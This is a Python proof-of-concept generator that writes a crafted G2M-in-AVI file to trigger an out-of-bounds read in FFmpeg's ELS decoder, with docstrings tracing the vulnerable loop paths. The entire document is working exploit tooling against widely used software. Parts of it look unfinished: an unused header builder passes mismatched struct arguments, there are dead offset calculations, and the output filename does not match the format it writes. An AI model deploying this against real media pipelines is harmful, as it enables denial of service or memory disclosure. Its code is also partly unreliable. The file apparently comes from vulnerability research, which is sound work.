#!/usr/bin/env python3
"""
PoC generator for VULN 001: OOB Read in ff_els_decode_bit
Craft a G2M-in-AVI file to trigger the unbounded while-decrement loop
in elsdec.c when z=0 is achieved.

Attack path:
  ffmpeg -i crafted.avi -> g2m_decode_frame() -> epic_jb_decode_tile()
  -> ff_els_decoder_init() -> ff_els_decode_bit() -> OOB read of els_exp_tab[]
"""

import struct
import sys

def pack_le32(v): return struct.pack('<I', v)
def pack_be32(v): return struct.pack('>I', v)
def pack_le16(v): return struct.pack('<H', v)

def riff_chunk(fourcc, data):
    """Pack a RIFF chunk: fourcc + LE32(size) + data (+ padding if odd)"""
    assert len(fourcc) == 4
    payload = data
    chunk = fourcc.encode('latin1') + pack_le32(len(payload)) + payload
    if len(payload) % 2 == 1:
        chunk += b'\x00'
    return chunk

def riff_list(listtype, fourcc, data):
    """Pack a LIST chunk"""
    payload = fourcc.encode('latin1') + data
    return b'LIST' + pack_le32(len(payload)) + payload

def build_avi_main_header(width, height, total_frames=1):
    """Build avih chunk data (56 bytes)"""
    return struct.pack('<IIIIIIIIIIIIII',
        33333,      # microSecPerFrame (30fps)
        0,          # maxBytesPerSec
        0,          # paddingGranularity
        0x10,       # flags: AVIF_HASINDEX
        total_frames,  # totalFrames
        0,          # initialFrames
        1,          # streams
        65536,      # suggestedBufferSize
        width,      # width
        height,     # height
        0, 0, 0, 0, # reserved
    )

def build_stream_header(width, height, total_frames=1):
    """Build strh chunk data (56 bytes)"""
    return struct.pack('<4s4sIHHIIIIIIIIhhhh',
        b'vids',    # fccType
        b'G2M4',    # fccHandler
        0,          # flags
        0,          # priority
        0,          # language
        0,          # initialFrames
        1,          # scale
        30,         # rate  (30fps)
        0,          # start
        total_frames,  # length
        65536,      # suggestedBufferSize
        0xFFFFFFFF, # quality
        0,          # sampleSize
        0, 0,       # left, top (frame rect)
        width,      # right
        height,     # bottom
    )

def build_bitmapinfoheader(width, height):
    """Build BITMAPINFOHEADER (40 bytes)"""
    return struct.pack('<IiiHHI4sIIII',
        40,         # biSize
        width,      # biWidth
        height,     # biHeight (positive = bottom-up)
        1,          # biPlanes
        24,         # biBitCount
        0,          # biCompression (will be overwritten with 'G2M4')
        b'G2M4',    # biCompression FourCC
        width * height * 3,  # biSizeImage
        0,          # biXPelsPerMeter
        0,          # biYPelsPerMeter
        0,          # biClrUsed
        0,          # biClrImportant
    )

def build_bitmapinfoheader_fixed(width, height):
    """Build BITMAPINFOHEADER (40 bytes) with G2M4 codec tag"""
    data  = pack_le32(40)           # biSize
    data += struct.pack('<i', width)  # biWidth
    data += struct.pack('<i', height) # biHeight
    data += pack_le16(1)            # biPlanes
    data += pack_le16(24)           # biBitCount
    data += b'G2M4'                 # biCompression (FourCC)
    data += pack_le32(width * height * 3)  # biSizeImage
    data += pack_le32(0)            # biXPelsPerMeter
    data += pack_le32(0)            # biYPelsPerMeter
    data += pack_le32(0)            # biClrUsed
    data += pack_le32(0)            # biClrImportant
    return data

def build_g2m_frame(width, height, tile_w, tile_h, els_data):
    """
    Build a G2M frame packet (what goes inside 00dc video chunk).

    Format (from g2meet.c / g2m_decode_frame):
      - 4 bytes magic: G2M4
      - Chunks: each is LE32(payload_size + 1) + byte(chunk_type) + payload

    DISPLAY_INFO (0xC8):
      BE32 width, BE32 height, BE32 compression, BE32 tile_w, BE32 tile_h,
      byte bpp, BE32 r_mask, BE32 g_mask, BE32 b_mask

    TILE_DATA (0xC9):
      byte tile_x, byte tile_y,
      VLI(els_dsize), els_data[els_dsize], jpeg_data...
    """
    magic = b'G2M4'

    # Build DISPLAY_INFO payload
    di_payload  = pack_be32(width)
    di_payload += pack_be32(height)
    di_payload += pack_be32(2)          # compression = COMPR_EPIC_J_B
    di_payload += pack_be32(tile_w)
    di_payload += pack_be32(tile_h)
    di_payload += bytes([32])           # bpp = 32
    di_payload += pack_be32(0xFF0000)   # r_mask
    di_payload += pack_be32(0x00FF00)   # g_mask
    di_payload += pack_be32(0x0000FF)   # b_mask
    di_payload += pack_be32(0)          # extra (makes chunk_size - 21 >= 16)

    # chunk_size = bytestream2_get_le32(&bc) - 1, so stored = len(payload) + 1
    di_chunk  = pack_le32(len(di_payload) + 1)
    di_chunk += bytes([0xC8])           # DISPLAY_INFO
    di_chunk += di_payload

    # Build TILE_DATA payload
    # VLI encoding: if els_dsize < 0x80, just one byte prefix
    els_dsize = len(els_data)
    if els_dsize < 0x80:
        vli = bytes([els_dsize])
    else:
        # Two-byte VLI: set high bit on first byte
        vli = bytes([0x80 | (els_dsize >> 8), els_dsize & 0xFF])

    td_payload  = bytes([0, 0])         # tile_x=0, tile_y=0
    td_payload += vli                   # ELS data size VLI
    td_payload += els_data              # ELS encoded data
    # No JPEG data needed (epic_jb_decode_tile uses remaining bytes as JPEG)

    td_chunk  = pack_le32(len(td_payload) + 1)
    td_chunk += bytes([0xC9])           # TILE_DATA
    td_chunk += td_payload

    return magic + di_chunk + td_chunk


def craft_els_data():
    """
    Craft ELS data to trigger the OOB read in ff_els_decode_bit().

    Two OOB paths are possible:

    PATH 1 (LPS while loop, line 338):
      When z=0, pAllowable[j-1] >= 0 is always true (uint32_t).
      Requires j to be small enough that pAllowable[j + ALps] = 0.
      els_exp_tab[0..35] = 0, so need j + ALps + 108 <= 35, i.e., j + ALps <= -73.

    PATH 2 (MPS while loop, lines 309-310):
      When ctx->t becomes negative (from t -= z where z > t), the comparison
      ctx->t > pAllowable[j] treats negative t as large unsigned, always TRUE.
      j++ loop runs past els_exp_tab array boundary.

      Trigger: after LPS events reduce t to ~41285, then a call with rung from
      a context where z = pAllowable[28] = 4892672 >> t → t becomes negative.
      The MPS while loop then increments j from 27 past 36, hitting pAllowable[37]
      = els_exp_tab[145] which is OOB (array has indices 0..144).

    Strategy:
    - Use all 0xFF bytes to keep x large (near 0xFFFFFF), maximizing LPS events
    - Each LPS reduces j by |ALps| and reduces t significantly
    - After enough LPS events, t gets small enough to cause t -= z overflow (negative)
    - Provide plenty of data (4KB) so decoder runs long enough to hit the bug

    The initial 3 bytes (0xFF 0xFF 0xFF) give ctx->x = 0xFFFFFF = 16777215.
    With t = 16777216 (ELS_MAX), t - z is typically small and <= x, forcing LPS.
    Each import byte = 0xFF keeps x near its maximum value.
    """
    # Provide 4KB of all-0xFF bytes
    # - First 3 bytes: initial ctx->x = 0xFFFFFF (max)
    # - Remaining: imported bytes during decode keep x large → LPS path
    # - Many LPS events drive t to small values → eventual negative t in MPS path
    data = bytes([0xFF] * 4096)
    return data


def build_avi(width, height, frame_data):
    """Build a minimal AVI file containing one G2M video frame."""

    # Stream header list
    strh_data = build_stream_header(width, height, total_frames=1)
    strf_data = build_bitmapinfoheader_fixed(width, height)

    strl_content = riff_chunk('strh', strh_data) + riff_chunk('strf', strf_data)
    strl = riff_list('LIST', 'strl', strl_content)

    # AVI main header
    avih_data = build_avi_main_header(width, height, total_frames=1)

    hdrl_content = riff_chunk('avih', avih_data) + strl
    hdrl = riff_list('LIST', 'hdrl', hdrl_content)

    # Movie data
    video_chunk = riff_chunk('00dc', frame_data)
    movi_content = video_chunk
    movi = riff_list('LIST', 'movi', movi_content)

    # IDX1 index
    # 00dc chunk position: after RIFF header (8) + hdrl size + movi LIST header (12)
    hdrl_full_size = 8 + len(hdrl)  # LIST tag(4) + size(4) + content
    # Actually hdrl is already the full LIST bytes
    movi_data_offset = 4 + 8 + len(hdrl)  # 'AVI ' + LIST hdrl
    video_data_offset = movi_data_offset + 8 + 4  # movi LIST header + 'movi' fourcc...

    # Simple IDX1 (optional but good practice)
    # flags: 0x10 = AVIIF_KEYFRAME
    idx1_entry = b'00dc' + pack_le32(0x10) + pack_le32(4) + pack_le32(len(frame_data))
    idx1 = riff_chunk('idx1', idx1_entry)

    # RIFF AVI
    riff_content = b'AVI ' + hdrl + movi + idx1
    riff = b'RIFF' + pack_le32(len(riff_content)) + riff_content

    return riff


def main():
    # Use larger frame and tile to increase ELS decoder processing time
    # and give more chances for the vulnerable state to be reached
    width  = 512
    height = 512
    tile_w = 128   # must be multiple of 16
    tile_h = 128

    els_data = craft_els_data()
    print(f"ELS data size: {len(els_data)} bytes")
    print(f"ELS data (hex): {els_data[:16].hex()}...")

    g2m_frame = build_g2m_frame(width, height, tile_w, tile_h, els_data)
    print(f"G2M frame size: {len(g2m_frame)} bytes")

    avi_data = build_avi(width, height, g2m_frame)

    output_file = 'vuln_001_input.g2m'
    with open(output_file, 'wb') as f:
        f.write(avi_data)
    print(f"Written {len(avi_data)} bytes to {output_file}")


if __name__ == '__main__':
    main()
